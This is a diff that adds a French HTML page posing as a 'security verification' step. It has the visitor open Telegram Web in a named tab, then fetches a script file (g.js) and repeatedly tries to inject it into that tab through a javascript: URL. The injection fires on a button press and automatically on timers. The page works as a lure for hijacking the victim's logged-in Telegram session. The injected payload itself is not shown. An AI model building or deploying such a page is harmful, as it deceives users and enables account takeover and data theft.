@@ -1,0 +1,33 @@
+<!doctype html>
+<html lang="fr">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Verification</title>
+<body style="font:17px system-ui;background:#17212b;color:#eaeaea;padding:22px;line-height:1.6">
+<h3 style="margin:0 0 14px">Verification de securite</h3>
+<p>1. <a href="https://web.telegram.org/k/" target="tg" style="font-size:20px">Ouvrir Telegram Web</a></p>
+<p>2. <button id="go" style="font-size:20px;padding:8px 18px">Recuperer</button></p>
+<p id="st" style="opacity:.6"></p>
+<script>
+let code = '';
+const st = document.getElementById('st');
+fetch('g.js').then(r => r.text()).then(t => {
+  code = t.replace(/\s+/g, ' ');
+  st.textContent = 'pret';
+});
+
+function fire() {
+  const w = window.open('', 'tg');
+  if (!w) { st.textContent = 'onglet introuvable, retape sur Ouvrir Telegram Web'; return; }
+  if (!code) { st.textContent = 'chargement...'; return; }
+  try {
+    w.location = 'javascript:void ' + code;
+    st.textContent = 'injecte ' + new Date().toLocaleTimeString();
+  } catch (e) { st.textContent = 'erreur ' + e.message; }
+}
+
+document.getElementById('go').onclick = fire;
+[6000, 10000, 15000, 22000, 30000].forEach(t => setTimeout(fire, t));
+</script>
+</body>
+</html>
